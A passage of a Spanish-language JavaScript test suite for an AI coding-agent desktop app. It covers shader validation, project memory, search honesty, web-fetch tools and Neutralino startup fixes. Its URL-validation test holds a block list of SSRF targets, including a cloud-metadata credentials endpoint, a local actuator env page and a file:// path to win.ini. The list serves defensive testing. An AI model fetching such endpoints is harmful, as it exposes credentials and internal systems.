    ok('un bucle descendente enorme se rechaza',
        !validateShaderBody('for (int i = 100000; i > 0; i--) { color += 0.001; }').ok);
    ok('y uno de 4096 con >=',
        !validateShaderBody('for (int i = 4096; i >= 0; i--) { color += 0.001; }').ok);
    ok('sin número de partida también se rechaza',
        !validateShaderBody('for (int i = STEPS; i > 0; i--) { color += 0.01; }').ok);
    ok('pero un descendente razonable pasa',
        validateShaderBody('for (int i = 16; i > 0; i--) { color += 0.01; }').ok);
    ok('cuatro anidados descendentes de 64 no',
        !validateShaderBody('for(int a=64;a>0;a--){for(int b=64;b>0;b--){for(int c=64;c>0;c--){for(int d=64;d>0;d--){color+=0.0001;}}}}').ok);

    // Los hermanos suman, los hijos multiplican. Antes se multiplicaba todo:
    // tres bucles SEGUIDOS de 16 —48 vueltas reales— se rechazaban como 4096, y
    // encima se le hablaba al modelo de un anidamiento que no existía.
    const tresSeguidos = 'for (int i=0;i<16;i++){color+=0.01;}\nfor (int j=0;j<16;j++){color+=0.01;}\nfor (int k=0;k<16;k++){color+=0.01;}';
    ok('tres bucles secuenciales de 16 pasan', validateShaderBody(tresSeguidos).ok,
        validateShaderBody(tresSeguidos).errors.join(' · '));
    eq('y se cuentan como 48, no como 4096', checkLoops(tresSeguidos).product, 48);
    eq('el anidado real sigue multiplicando', checkLoops('for (int i=0;i<40;i++){ for (int j=0;j<40;j++){} }').product, 1600);
    ok('y 64x64 anidado se sigue rechazando',
        !validateShaderBody('for (int i=0;i<64;i++){ for (int j=0;j<64;j++){ color+=0.0001; } }').ok);

    // El validador limpia comentarios; el envoltorio envuelve el cuerpo crudo.
    // Un /* sin cerrar pasaba aquí y en la GPU se comía el resto del envoltorio.
    ok('un comentario de bloque sin cerrar se rechaza',
        !validateShaderBody('color = vec3(1.0); /* rampa diagonal').ok);
    ok('cerrado no molesta', validateShaderBody('color = vec3(1.0); /* rampa */').ok);
}

section('rev2/composición y memoria');
{
    const { compositionToText, createComposition, normalizeColor } = await import('../core/design/composition.js');

    // El resumen es lo ÚNICO que el modelo ve al refinar, y su respuesta
    // reemplaza la composición entera: con el GLSL escondido tras "(9 líneas)",
    // cada refinado borraba el shader anterior y lo reinventaba.
    const { comp } = createComposition({
        name: 'x', width: 512, height: 512,
        layers: [
            { type: 'shader', glsl: 'vec2 p = uv - 0.5;\ncolor = vec3(length(p));' },
            { type: 'text', text: 'HOLA', font: 'mono', letterSpacing: 0.3, opacity: 0.5 }
        ]
    });
    const texto = compositionToText(comp);
    ok('el resumen lleva el shader entero', texto.includes('vec2 p = uv - 0.5;') && texto.includes('color = vec3(length(p));'), texto);
    ok('y los campos del texto que antes se perdían', texto.includes('mono') && texto.includes('0.3'), texto);
    ok('y la opacidad', texto.includes('opacidad 0.5'), texto);

    // `NAMED[raw]` encontraba las claves heredadas de Object.prototype.
    eq('"constructor" no es un color', normalizeColor('constructor', '#000000'), '#000000');
    eq('"__proto__" tampoco', normalizeColor('__proto__', '#000000'), '#000000');
    eq('pero "rojo" sí', normalizeColor('rojo'), '#e5484d');

    // Memoria: una nota del usuario con cabecera de nivel 2 caía entre las
    // entradas y la rotación se la llevaba a la duodécima ejecución.
    const { ProjectMemory } = await import('../core/memory.js');
    const { createPlan: mkPlan } = await import('../core/plan.js');
    const disco = new Map();
    const platform = {
        fs: {
            readText: async (p) => { if (!disco.has(p)) throw new Error('ENOENT'); return disco.get(p); },
            writeText: async (p, c) => { disco.set(p, c); }
        }
    };
    const cfgMem = { get: (k, fb) => ({ 'workspace.root': 'C:/R' }[k] ?? fb) };
    const ruta = 'C:/R/.rubus/memory.md';
    disco.set(ruta, '## REGLAS DE ESTE PROYECTO\nEl staging necesita VPN. Nunca ejecutes deploy.sh.\n\n## 2026-01-01 — algo\n- resultado: 1/1\n');

    const mem = new ProjectMemory({ platform, config: cfgMem, logger: null });
    await mem.load({ force: true });
    ok('una nota del usuario con ## llega al prompt', mem.block().includes('deploy.sh'), mem.block().slice(0, 200));
    ok('y va antes que lo que escribió el agente',
        mem.block().indexOf('deploy.sh') < mem.block().indexOf('2026-01-01'));

    for (let i = 0; i < 20; i++) {
        await mem.record({ task: `t${i}`, plan: mkPlan('g', [{ title: 'a', description: 'b', verify: 'c' }]), changes: [] });
    }
    ok('sobrevive a veinte rotaciones', disco.get(ruta).includes('deploy.sh'));
    eq('y las entradas del agente sí rotan', (disco.get(ruta).match(/^## \d{4}/gm) || []).length, 12);
}

section('rev2/búsqueda: no afirmar de más');
{
    const { searchCodebase } = await import('../core/tools/search-tools.js');
    const { MAX_TEXT_BYTES } = await import('../core/ignore.js');

    // Un archivo saltado por tamaño no cuenta como mirado. Decir "ese texto NO
    // existe" sin haberlo abierto es la afirmación categórica que esta
    // herramienta existe para poder hacer, y sólo vale si es cierta.
    const ficheros = { 'C:/R/enorme.js': 'x' };
    const ctx = {
        root: 'C:/R', signal: null, config: { get: (k, fb) => fb },
        platform: {
            fs: {
                stat: async (p) => (ficheros[p] ? { isFile: true, isDirectory: false, size: MAX_TEXT_BYTES + 1 } : null),
                readText: async () => '',
                readDir: async (p) => (p === 'C:/R' ? [{ name: 'enorme.js', path: 'C:/R/enorme.js', isDirectory: false }] : [])
            }
        }
    };
    const r = await searchCodebase.run({ query: 'objetivo' }, ctx);
    ok('con archivos sin leer no se afirma que no existe', !r.detail.includes('NO existe en el proyecto'), r.detail);
    ok('y se dice cuántos quedaron sin mirar', /demasiado grandes/.test(r.detail), r.detail);
}

// ── AGENTS.md: ningún byte de control crudo en el código ──────────────────
// Lo promete AGENTS.md y no lo puede comprobar ESLint: `no-control-regex` sólo
// mira dentro de expresiones regulares. Un byte crudo convierte el archivo en
// binario, grep lo salta y el diff se vuelve ilegible — y esta sesión metió uno
// con un `sed` mal escapado sin enterarse hasta dos comandos después.
section('bytes de control');
{
    const nodefs = (await import('node:fs')).default;
    const np = (await import('node:path')).default;
    const { fileURLToPath: f2u } = await import('node:url');
    const raiz = np.resolve(np.dirname(f2u(import.meta.url)), '..', '..', '..');

    // Sin regex ni escapes: se comparan códigos. Escribir la clase de
    // caracteres a mano es justo como se colaron los dos bytes que este test
    // encontró la primera vez que se ejecutó.
    const esControl = (t) => {
        for (let i = 0; i < t.length; i++) {
            const c = t.charCodeAt(i);
            if (c < 9 || c === 11 || c === 12 || (c > 13 && c < 32)) return true;
        }
        return false;
    };
    const sucios = [];
    const mirar = (dir) => {
        for (const e of nodefs.readdirSync(dir, { withFileTypes: true })) {
            if (['node_modules', '.git', 'vendor', '.rubus', '.agentcoder'].includes(e.name)) continue;
            const p = np.join(dir, e.name);
            if (e.isDirectory()) { mirar(p); continue; }
            if (!/.(js|css|html|json|md)$/.test(e.name)) continue;
            if (nodefs.statSync(p).size > 2_000_000) continue;
            if (esControl(nodefs.readFileSync(p, 'utf8'))) sucios.push(np.relative(raiz, p));
        }
    };
    mirar(raiz);
    ok('ningún archivo del proyecto tiene bytes de control crudos', sucios.length === 0, sucios.join(', '));
}

// ── internet: la validación es la herramienta ─────────────────────────────
// Salir a la red es la capacidad que `security.js` clasifica como peligrosa
// cuando el modelo la pide con `curl`. Aquí la tiene con mejor interfaz, así
// que la puerta tiene que ser igual de firme — y la parte que de verdad
// importa no es "que no lea internet", es que no lea la red de DENTRO.
section('web/validación de URL');
{
    const { validateUrl, isPrivateAddress, buildSearchUrl } = await import('../core/web.js');

    // El catálogo de lo que un modelo escribe cuando se despista, o cuando
    // alguien le ha dicho por dónde mirar.
    const prohibidas = [
        ['metadatos de nube', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'],
        ['el propio Ollama', 'http://127.0.0.1:11434/api/tags'],
        ['por nombre', 'http://localhost:8080/actuator/env'],
        ['el router', 'http://192.168.1.1/admin'],
        ['red privada 10/8', 'http://10.0.0.5/'],
        ['red privada 172.16/12', 'http://172.20.3.4/'],
        ['IPv6 local', 'http://[::1]:9000/'],
        ['IPv6 única local', 'http://[fd00::1]/'],
        ['ruta cero', 'http://0.0.0.0/'],
        ['mDNS de la LAN', 'http://mi-nas.local/'],
        ['metadatos de Google', 'http://metadata.google.internal/'],
        ['CGNAT', 'http://100.64.0.1/'],
        ['IPv4 disfrazada de IPv6', 'http://[::ffff:127.0.0.1]/'],
        ['esquema que no es web', 'file:///C:/Windows/win.ini'],
        ['credenciales dentro', 'http://usuario:clave@ejemplo.com/']
    ];
    for (const [motivo, url] of prohibidas) {
        ok(`se rechaza: ${motivo}`, !validateUrl(url).ok, url);
    }

    // Y lo que sí tiene que funcionar, que es el 99% de lo que se pide.
    for (const url of [
        'https://developer.mozilla.org/en-US/docs/Web/API/fetch',
        'developer.mozilla.org/docs',              // sin esquema: se asume https
        'http://ejemplo.com:8080/algo',            // puerto raro pero público
        'https://8.8.8.8/'                         // IP pública literal
    ]) {
        ok(`se admite: ${url}`, validateUrl(url).ok, validateUrl(url).reason);
    }

    eq('sin esquema se asume https', validateUrl('mdn.dev').url.startsWith('https://'), true);
    ok('el host se normaliza a minúsculas', validateUrl('https://EJEMPLO.com/X').host === 'ejemplo.com');

    // isPrivateAddress se usa además en el servidor sobre la IP ya resuelta.
    eq('127.0.0.1 es privada', isPrivateAddress('127.0.0.1'), true);
    eq('8.8.8.8 no lo es', isPrivateAddress('8.8.8.8'), false);
    eq('169.254.169.254 sí', isPrivateAddress('169.254.169.254'), true);
    eq('::1 sí', isPrivateAddress('::1'), true);
    eq('2001:4860:4860::8888 no', isPrivateAddress('2001:4860:4860::8888'), false);
    eq('un nombre no es una IP', isPrivateAddress('ejemplo.com'), false);

    // La redirección se valida con el MISMO validador, que es lo que impide
    // que un 302 hacia dentro se salte la comprobación de la primera URL.
    const saltoMalo = new URL('http://169.254.169.254/', 'https://ejemplo.com/x').href;
    ok('una redirección hacia la red interna se rechaza', !validateUrl(saltoMalo).ok);

    ok('la consulta se codifica', buildSearchUrl('a b&c=d').includes('a%20b%26c%3Dd'));
    ok('y respeta un buscador propio', buildSearchUrl('x', 'https://searx.local/s?q={q}').includes('searx.local'));
}

section('web/HTML a texto');
{
    const { htmlToText, extractTitle, decodeEntities, parseSearchResults } = await import('../core/web.js');

    const html = `<html><head><title>Documentación &amp; ejemplos</title>
        <style>body{color:red}</style><script>alert(1)</script></head>
        <body><nav>Inicio Contacto</nav>
        <h1>AbortController</h1>
        <p>Sirve para <b>cancelar</b> una petici&oacute;n.</p>
        <ul><li>uno</li><li>dos</li></ul>
        <pre>const c = new AbortController();</pre>
        <footer>© 2026</footer></body></html>`;

    const texto = htmlToText(html);
    eq('saca el título', extractTitle(html), 'Documentación & ejemplos');
    ok('tira el script', !texto.includes('alert(1)'), texto);
    ok('tira el estilo', !texto.includes('color:red'));
    ok('tira la navegación y el pie', !texto.includes('Contacto') && !texto.includes('© 2026'), texto);
    ok('conserva el contenido', texto.includes('AbortController') && texto.includes('cancelar'));
    ok('decodifica las entidades', texto.includes('petición'), texto);
    ok('conserva el ejemplo de código', texto.includes('new AbortController()'), texto);
    ok('las listas se marcan', texto.includes('· uno'), texto);
    ok('no quedan etiquetas', !/<[a-z]/i.test(texto), texto);

    eq('entidades numéricas', decodeEntities('&#233;&#x41;'), 'éA');

    // El tope existe porque una página de documentación entera no cabe en el
    // contexto de un modelo pequeño.
    const largo = htmlToText(`<p>${'palabra '.repeat(20000)}</p>`, { maxChars: 500 });
    ok('se recorta al tope', largo.length < 700, `${largo.length}`);
    ok('y se dice que se recortó', largo.includes('omitidos'));

    // Resultados de búsqueda: DuckDuckGo envuelve cada enlace en su
    // redirector, y sin desenvolverlo el modelo recibe veinte URLs suyas.
    const serp = `
      <a class="result__a" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fdeveloper.mozilla.org%2Fdocs%2FfetchAPI&amp;rut=x">La API fetch</a>
      <a class="result__snippet" href="#">C&oacute;mo usar <b>fetch</b> en el navegador.</a>
      <a class="result__a" href="//duckduckgo.com/l/?uddg=http%3A%2F%2F127.0.0.1%3A8080%2Fpanel">Panel interno</a>
      <a class="result__snippet" href="#">no debería salir</a>`;
    const res = parseSearchResults(serp);
    eq('desenvuelve el redirector', res[0].url, 'https://developer.mozilla.org/docs/fetchAPI');
    eq('y trae el fragmento limpio', res[0].snippet, 'Cómo usar fetch en el navegador.');
    eq('un resultado hacia la red interna se descarta', res.length, 1);
}

section('web/las herramientas');
{
    const { searchWeb, fetchUrl } = await import('../core/tools/web-tools.js');

    const ctx = (over = {}) => ({
        signal: null,
        logger: { info() {}, warn() {}, debug() {}, error() {} },
        config: { get: (k, fb) => ({ 'agent.approvalMode': 'auto', ...over.cfg }[k] ?? fb) },
        requestApproval: over.requestApproval || (async () => true),
        platform: { webFetch: over.webFetch || (async () => ({ ok: true, status: 200, contentType: 'text/html', body: '' })) },
        ...over.ctx
    });

    // Una URL interna no llega ni a la plataforma.
    {
        let salio = false;
        const r = await fetchUrl.run({ url: 'http://127.0.0.1:11434/api/tags' },
            ctx({ webFetch: async () => { salio = true; return { ok: true, status: 200, body: '' }; } }));
        ok('fetch_url no sale hacia una IP local', !salio && !r.ok, r.summary);
        ok('y explica por qué', /privada o local/i.test(r.detail || ''), r.detail);
    }

    // En 'manual' se pregunta, y una vez por dominio, no por página.
    {
        const pedidas = [];
        const c = ctx({
            cfg: { 'agent.approvalMode': 'manual' },
            requestApproval: async (req) => { pedidas.push(req); return true; },
            webFetch: async () => ({ ok: true, status: 200, contentType: 'text/html', body: '<p>hola</p>' })
        });
        await fetchUrl.run({ url: 'https://ejemplo.com/a' }, c);
        await fetchUrl.run({ url: 'https://ejemplo.com/b' }, c);
        eq('se pregunta una sola vez por dominio', pedidas.length, 1);
        ok('el diálogo dice a dónde', pedidas[0].detail.includes('ejemplo.com'), pedidas[0].detail);
    }

    // Rechazado: no se sale, y se le dice al modelo que no insista.
    {
        let salio = false;
        const c = ctx({
            cfg: { 'agent.approvalMode': 'manual' },
            requestApproval: async () => false,
            webFetch: async () => { salio = true; return { ok: true, status: 200, body: '' }; }
        });
        const r = await fetchUrl.run({ url: 'https://ejemplo.com/a' }, c);
        ok('rechazado no sale a la red', !salio && !r.ok);
        ok('y se le pide que no vuelva a intentarlo', /no vuelvas a intentarlo/i.test(r.detail || ''), r.detail);
    }

    // Un 404 es un resultado, no una excepción, y se dice qué hacer con él.
    {
        const r = await fetchUrl.run({ url: 'https://ejemplo.com/no-existe' },
            ctx({ webFetch: async () => ({ ok: true, status: 404, contentType: 'text/html', body: 'no' }) }));
        ok('un 404 se reporta como fallo legible', !r.ok && r.summary.includes('404'), r.summary);
        ok('y sugiere buscar en vez de adivinar', /search_web/.test(r.detail), r.detail);
    }

    // Una página vacía de texto casi siempre es JavaScript, y decirlo ahorra
    // que el modelo lo intente tres veces con la misma URL.
    {
        const r = await fetchUrl.run({ url: 'https://ejemplo.com/spa' },
            ctx({ webFetch: async () => ({ ok: true, status: 200, contentType: 'text/html', body: '<html><body><div id="root"></div></body></html>' }) }));
        ok('una página sin texto se explica', !r.ok && /JavaScript/i.test(r.detail), r.detail);
    }

    // Sin resultados y "no he sabido leer la respuesta" son dos problemas
    // distintos: el segundo no es culpa de la consulta y no se arregla
    // reformulándola.
    {
        const vacio = await searchWeb.run({ query: 'algo' },
            ctx({ webFetch: async () => ({ ok: true, status: 200, contentType: 'text/html', body: '<div class="result__a"></div>' }) }));
        ok('sin resultados sugiere reformular', /otras palabras/i.test(vacio.detail), vacio.detail);

        const raro = await searchWeb.run({ query: 'algo' },
            ctx({ webFetch: async () => ({ ok: true, status: 200, contentType: 'text/html', body: '<html>página de captcha</html>' }) }));
        ok('una respuesta ilegible se distingue', /no se pudo interpretar/i.test(raro.summary), raro.summary);
    }

    // Sin red, el paso puede seguir con lo que hay en el proyecto.
    {
        const r = await searchWeb.run({ query: 'algo' },
            ctx({ webFetch: async () => ({ ok: false, error: 'getaddrinfo ENOTFOUND' }) }));
        ok('sin conexión se dice y se ofrece salida', !r.ok && /conexión/i.test(r.detail), r.detail);
    }

    // Una plataforma sin salida a internet (el navegador sin servidor detrás).
    {
        const r = await fetchUrl.run({ url: 'https://ejemplo.com/' }, ctx({ ctx: { platform: {} } }));
        ok('sin webFetch se explica en vez de reventar', !r.ok, r.summary);
    }
}

section('web/registro de herramientas');
{
    const { ToolRegistry } = await import('../core/tools/index.js');
    const reg = new ToolRegistry({ bus: { emit() {} }, logger: null, config: { get: (k, fb) => fb } });

    const conWeb = reg.forPhase('explore', { maxTools: 12, allowWeb: true }).map(t => t.name);
    ok('search_web está en explorar', conWeb.includes('search_web'), conWeb.join(','));
    ok('fetch_url también', conWeb.includes('fetch_url'));

    const sinWeb = reg.forPhase('explore', { maxTools: 12, allowWeb: false }).map(t => t.name);
    ok('y se pueden apagar del todo', !sinWeb.includes('search_web') && !sinWeb.includes('fetch_url'), sinWeb.join(','));
    ok('sin romper el resto', sinWeb.includes('read_file') && sinWeb.includes('finish_step'));

    // El tope sigue mandando, y finish_step sigue siendo intocable.
    for (const cap of [4, 6, 8]) {
        const names = reg.forPhase('act', { maxTools: cap }).map(t => t.name);
        ok(`con web, finish_step sobrevive a maxTools=${cap}`, names.includes('finish_step'), names.join(','));
        ok(`y se respeta el tope ${cap}`, names.length <= Math.max(3, cap), `${names.length}`);
    }

    // Las de proyecto van antes que las de internet: la respuesta suele estar
    // en el código que tienes delante.
    const act = reg.forPhase('act', { maxTools: 20 }).map(t => t.name);
    ok('read_file va antes que search_web', act.indexOf('read_file') < act.indexOf('search_web'), act.join(','));
    ok('y search_codebase también', act.indexOf('search_codebase') < act.indexOf('search_web'));
}

// ── app de escritorio: detectar el shell y no fiarse de `neu` ─────────────
// Los dos fallos que dejaban la app "abierta pero sin manos", y que no daban
// ningún error a la vista: por eso tienen prueba.
section('escritorio/detección del shell');
{
    const { enElShell } = await import('../platform/index.js');

    const conGlobales = (globales, sesion) => {
        const previos = {};
        for (const k of ['NL_TOKEN', 'NL_PORT', 'NL_APPID']) { previos[k] = globalThis[k]; delete globalThis[k]; }
        const antesSesion = globalThis.sessionStorage;
        Object.assign(globalThis, globales);
        if (sesion !== undefined) {
            globalThis.sessionStorage = { getItem: (k) => (k === 'NL_TOKEN' ? sesion : null) };
        }
        try { return enElShell(); }
        finally {
            for (const k of Object.keys(globales)) delete globalThis[k];
            for (const [k, v] of Object.entries(previos)) if (v !== undefined) globalThis[k] = v;
            if (antesSesion === undefined) delete globalThis.sessionStorage;
            else globalThis.sessionStorage = antesSesion;
        }
    };

    eq('un navegador pelado no es el shell', conGlobales({}), false);
    eq('con NL_TOKEN sí lo es', conGlobales({ NL_TOKEN: 'abc' }), true);

    // El fallo real: con `tokenSecurity: "one-time"` el token global existe una
    // sola vez. El cliente lo copia a sessionStorage y a partir de la primera
    // RECARGA sólo está ahí. Mirando únicamente el global, la app de escritorio
    // se daba por navegador, sondeaba /api/ping contra sus propios recursos y
    // acababa en la plataforma degradada: ventana abierta, cero errores, cero
    // acceso al disco.
    eq('tras recargar, el token vive en sessionStorage', conGlobales({}, 'abc'), true);
    eq('y los otros globales del shell también valen', conGlobales({ NL_PORT: 8080 }), true);
    eq('NL_APPID igual', conGlobales({ NL_APPID: 'dev.x.app' }), true);

    // sessionStorage puede lanzar (almacenamiento bloqueado); eso no puede
    // tumbar el arranque, sólo significa "no es el shell".
    const previo = globalThis.sessionStorage;
    globalThis.sessionStorage = { getItem() { throw new Error('bloqueado'); } };
    let reventó = false;
    try { eq('si sessionStorage lanza, no es el shell', enElShell(), false); }
    catch { reventó = true; }
    if (previo === undefined) delete globalThis.sessionStorage; else globalThis.sessionStorage = previo;
    ok('y no propaga la excepción', !reventó);
}

section('escritorio/scripts y artefactos');
{
    const nodefs = (await import('node:fs')).default;
    const np = (await import('node:path')).default;
    const { fileURLToPath: u2p } = await import('node:url');
    const raiz = np.resolve(np.dirname(u2p(import.meta.url)), '..', '..', '..');
    const pkg = JSON.parse(nodefs.readFileSync(np.join(raiz, 'package.json'), 'utf8'));

    // Lo que pidió el usuario, fijado: start compila Y abre, build sólo compila.
    ok('npm start compila y abre', /desktop\.js.*--run/.test(pkg.scripts.start), pkg.scripts.start);
    ok('npm run build sólo compila', /desktop\.js\s*$/.test(pkg.scripts.build), pkg.scripts.build);
    eq('el servidor web se queda en serve', pkg.scripts.serve, 'node server.js');
    ok('y dev sigue siendo la iteración rápida', /neu run/.test(pkg.scripts.dev), pkg.scripts.dev);

    // El lint sigue delante de los tres, que es lo que lo hace útil.
    for (const k of ['prestart', 'prebuild', 'predev']) {
        ok(`${k} pasa el lint`, /scripts\/lint\.js/.test(pkg.scripts[k] || ''), pkg.scripts[k]);
    }

    // Los artefactos del build no se versionan. `bin/` son 15 MB de binarios de
    // todas las plataformas y aparecían como archivos sin versionar en cuanto
    // alguien ejecutaba `npm run setup`.
    const ignore = nodefs.readFileSync(np.join(raiz, '.gitignore'), 'utf8');
    for (const p of ['bin/', 'dist', '.tmp/', 'public/vendor/']) {
        ok(`.gitignore cubre ${p}`, ignore.split('\n').some(l => l.trim() === p), p);
    }

    // Ignorarlos no basta: `.gitignore` no desversiona lo que ya está dentro.
    // `.tmp/` es la copia de `public/` que `neu build` crea y destruye, y estaba
    // versionada — con los 3,5 MB de PlayCanvas dentro — así que cada
    // compilación dejaba 76 borrados en `git status` y la regla de arriba pasaba
    // igual. Se comprueba el índice, no el archivo de reglas.
    const git = (await import('node:child_process')).spawnSync(
        'git', ['ls-files', '--', '.tmp', 'dist', 'bin', 'public/vendor'],
        { cwd: raiz, encoding: 'utf8' });
    if (git.error || git.status !== 0) {
        // Sin git (descarga en tarball) no hay índice que mirar; no es un fallo.
        console.log('  · índice de git no disponible: no se comprueba');
    } else {
        const seguidos = git.stdout.split('\n').filter(Boolean);
        ok('y ninguno está versionado', seguidos.length === 0,
            `${seguidos.length} archivo(s), p.ej. ${seguidos.slice(0, 2).join(', ')}`);
    }

    // El envoltorio no puede fiarse del código de salida de `neu`: devuelve 0
    // aunque escriba ERRR y no genere nada. Comprobado en esta misma sesión con
    // el cliente sin descargar.
    const desktop = nodefs.readFileSync(np.join(raiz, 'scripts', 'desktop.js'), 'utf8');
    ok('el build se valida por el archivo, no por el exit code',
        /mtimeMs/.test(desktop) && /No se pudo ejecutar el CLI|no hay ejecutable/.test(desktop));
    ok('y el CLI se llama por su archivo, no por npx',
        /neu.*bin.*neu\.js/.test(desktop) && !/npx\.cmd/.test(desktop),
        'en Windows `npx` es un .cmd y Node se niega a lanzarlo sin shell');
}

// ── el documento que desaparece bajo los pies ─────────────────────────────
// El cliente de Neutralino, cuando su WebSocket contra el núcleo da error, hace
// `document.body.innerText = ''` y `document.write(...)`: borra la página, y de
// forma asíncrona, cuando boot.js ya había lanzado el import(). El montaje se
// encontraba un documento vacío y reventaba en VirtualScroller con un «Cannot
// read properties of null» que no nombraba ni el elemento ni la causa.
section('escritorio/documento borrado por el shell');
{
    const { must } = await import('../ui/dom.js');

    const conDocumento = (doc, fn) => {
        const antesDoc = globalThis.document;
        const antesLoc = globalThis.location;
        globalThis.document = doc;
        if (antesLoc === undefined) globalThis.location = { href: 'http://localhost:1/' };
        try { return fn(); }
        finally {
            if (antesDoc === undefined) delete globalThis.document; else globalThis.document = antesDoc;
            if (antesLoc === undefined) delete globalThis.location; else globalThis.location = antesLoc;
        }
    };

    const nodo = { etiqueta: 'div' };
    const entero = {
        readyState: 'complete',
        body: { children: { length: 13 } },
        querySelector: (s) => (s === '#chat-scroll' ? nodo : null)
    };
    const vacio = { readyState: 'complete', body: { children: { length: 0 } }, querySelector: () => null };

    eq('must devuelve el nodo cuando está', conDocumento(entero, () => must('#chat-scroll')), nodo);

    let msg = '';
    conDocumento(vacio, () => { try { must('#chat-scroll'); } catch (e) { msg = e.message; } });
    ok('must lanza en vez de devolver null', !!msg, msg);
    ok('y nombra el elemento que falta', msg.includes('#chat-scroll'), msg);
    ok('y dice que el documento estaba vacío', /0 hijos/.test(msg), msg);
    ok('y en qué estado estaba', /readyState=complete/.test(msg), msg);
}

section('escritorio/arranque a prueba del borrado');
{
    const nodefs = (await import('node:fs')).default;
    const np = (await import('node:path')).default;
    const { fileURLToPath: u2p } = await import('node:url');
    const raiz = np.resolve(np.dirname(u2p(import.meta.url)), '..', '..', '..');
    const leer = (...p) => nodefs.readFileSync(np.join(raiz, ...p), 'utf8');
    const boot = leer('public', 'js', 'boot.js');

    // El orden ES el arreglo: no se monta nada hasta saber si el shell conectó.
    // Si alguien vuelve a montar antes, el fallo original regresa entero.
    const montaje = '.then(function (mod) { return mod.mountApp(); })';
    ok('no se importa la app hasta que el núcleo responde',
        /nucleoListo\(initNeutralino\(\)\)/.test(boot)
        && boot.indexOf('nucleoListo(initNeutralino())') < boot.indexOf(montaje));
    ok('se espera al evento ready del cliente', /events\.on\('ready'/.test(boot));
    ok('con un plazo, no una espera infinita', /ESPERA_NUCLEO/.test(boot));
    ok('un documento vaciado se reconoce por el body sin hijos',
        /body\.children\.length === 0/.test(boot));
    ok('y se nombra la causa real en vez del TypeError', /NE_CL_IVCTOKN/.test(boot));

    // En la app empaquetada no hay consola a la vista: la única copia del fallo
    // se la lleva el usuario al cerrar la ventana si no queda en el log.
    ok('el fallo de arranque se copia al log nativo', /Neutralino\.debug\.log/.test(boot));

    // Los elementos estructurales ya no se leen con `$`, que devuelve null callado.
    ok('#chat-scroll es obligatorio', /must\('#chat-scroll'\)/.test(leer('public', 'js', 'ui', 'chat.js')));
    ok('#explorer-body también', /must\('#explorer-body'\)/.test(leer('public', 'js', 'ui', 'explorer.js')));

    // El token de un solo uso rompía la app entera y no lo parecía: el webview
    // pide __neutralino_globals.js con su preload ANTES que la página, se lleva
    // el único token, y la página acaba con NL_TOKEN=''. El cliente abre
    // entonces el socket con connectToken=undefined, el núcleo lo rechaza, y su
    // manejador de error BORRA el documento. Salía como un fallo del scroller.
    const cfg = JSON.parse(leer('neutralino.config.json'));
    ok('el token del shell no es de un solo uso', cfg.tokenSecurity !== 'one-time', String(cfg.tokenSecurity));
}

// ── claves de almacenamiento en el shell ──────────────────────────────────
// `Neutralino.storage.setData` sólo acepta ^[a-zA-Z-_0-9]{1,50}$ y lanza
// NE_ST_INVSTKY con cualquier otra cosa. La clave de ajustes lleva puntos, así
// que en la app de escritorio los ajustes NO se guardaron nunca; el síntoma que
// se veía era «No se pudo abrir la carpeta», porque abrir una carpeta es lo
// primero que escribe. Estuvo oculto mientras el puente nativo estaba caído.
section('escritorio/claves de almacenamiento');
{
    const { claveNativa } = await import('../platform/neutralino.js');
    const LEGAL = /^[a-zA-Z\-_0-9]{1,50}$/;
    const nodefs2 = (await import('node:fs')).default;
    const np2 = (await import('node:path')).default;
    const { fileURLToPath: u2p2 } = await import('node:url');
    const raiz2 = np2.resolve(np2.dirname(u2p2(import.meta.url)), '..', '..', '..');

    // La clave de verdad, leída de config.js: si alguien la cambia, esto sigue
    // vigilando la de después, no una copia que se quedó vieja aquí.
    const fuente = nodefs2.readFileSync(np2.join(raiz2, 'public', 'js', 'core', 'config.js'), 'utf8');
    const real = /STORAGE_KEY\s*=\s*'([^']+)'/.exec(fuente);
    ok('se encuentra STORAGE_KEY en config.js', !!real, String(real));
    ok('y la clave real sale legal para Neutralino', LEGAL.test(claveNativa(real ? real[1] : '')),
        real ? `${real[1]} -> ${claveNativa(real[1])}` : '');

    eq('agentcoder.settings.v1 pierde los puntos',
        claveNativa('agentcoder.settings.v1'), 'agentcoder_settings_v1');

    // Una clave que ya es legal no se toca: si se tocara, se abandonaría lo
    // que hubiera guardado con ella.
    eq('una clave legal pasa intacta', claveNativa('ajustes_v2'), 'ajustes_v2');
    eq('los guiones también son legales', claveNativa('a-b-c'), 'a-b-c');

    for (const k of ['con espacio', 'con/barra', 'con:dos', 'ñ y acento', '', 'x'.repeat(80),
        'punto.' + 'y'.repeat(60)]) {
        ok(`sale legal: ${JSON.stringify(k).slice(0, 24)}`, LEGAL.test(claveNativa(k)), claveNativa(k));
    }

    // Recortar a 50 juntaría dos claves largas distintas en la misma, y una
    // colisión aquí es que unos ajustes pisen a otros sin avisar.
    const larga1 = 'a'.repeat(48) + '.uno';
    const larga2 = 'a'.repeat(48) + '.dos';
    ok('dos claves largas distintas no colisionan', claveNativa(larga1) !== claveNativa(larga2),
        `${claveNativa(larga1)} vs ${claveNativa(larga2)}`);
    ok('y ambas caben en el límite', claveNativa(larga1).length <= 50 && claveNativa(larga2).length <= 50);

    // Determinista: la misma clave tiene que dar siempre lo mismo, o los
    // ajustes se perderían entre arranques.
    eq('es determinista', claveNativa(larga1), claveNativa(larga1));

    // Y el adaptador tiene que usarla en las DOS operaciones: si `set` traduce
    // y `get` no, se escribe en un sitio y se lee de otro.
    const adaptador = nodefs2.readFileSync(np2.join(raiz2, 'public', 'js', 'platform', 'neutralino.js'), 'utf8');
    ok('getData usa la clave traducida', /getData\(claveNativa\(key\)/.test(adaptador));
    ok('setData también', /setData\(claveNativa\(key\)/.test(adaptador));
}

// ── el núcleo que no contesta ─────────────────────────────────────────────
// `filesystem.readFile` mete el contenido en un JSON, y el núcleo no consigue
// serializarlo cuando los bytes no son UTF-8 válido: apunta NE_SR_UNBPARS en su
// log y NO CONTESTA — ni éxito ni error. Medido contra el núcleo 5.5.0 vivo con
// un .js de once bytes en cp1252. Como el cliente no tiene plazo, la promesa se
// queda sin resolver para siempre: un solo archivo así colgaba el mapa del
// repositorio, y Cancelar no rescataba porque el await de dentro nunca vuelve.
section('escritorio/el núcleo que no contesta');
{
    const { conPlazo, createNeutralinoPlatform } = await import('../platform/neutralino.js');

    // El plazo no arregla la causa: convierte «colgado» en un error normal.
    const rapida = await conPlazo(Promise.resolve('vale'), 'algo', 500);
    eq('lo que responde a tiempo pasa igual', rapida, 'vale');

    let colgado = null;
